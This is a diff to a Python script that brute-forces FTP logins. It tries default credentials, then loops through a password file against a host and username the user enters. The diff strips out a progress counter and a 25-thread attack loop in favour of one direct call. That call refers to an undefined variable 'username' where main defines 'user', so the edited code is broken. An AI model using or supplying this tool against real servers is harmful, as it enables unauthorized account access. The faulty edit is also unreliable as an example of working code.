@@ -1,6 +1,5 @@
 import ftplib
 import threading
-import sys
 from termcolor import colored
 
 
@@ -32,8 +31,6 @@ def brute_login(host, username, passfile):
         passfile = open(passfile, "r")
         for i, pwd in enumerate(passfile.readlines()):
             pwd = pwd.strip()
-            sys.stdout.write("\r" + str(i))
-            sys.stdout.flush()
             check_login(host, username, pwd)
     except Exception as E:
         print(E)
@@ -45,7 +42,5 @@ def main():
     file = input("Enter filename: ")
     user = input("Enter username: ")
     default_login(host)
-    for i in range(25):
-        t = threading.Thread(target=brute_login, args=(host, user, file))
-        t.start()
+    brute_login(host,username,file)
     print("[!] Process complete!")
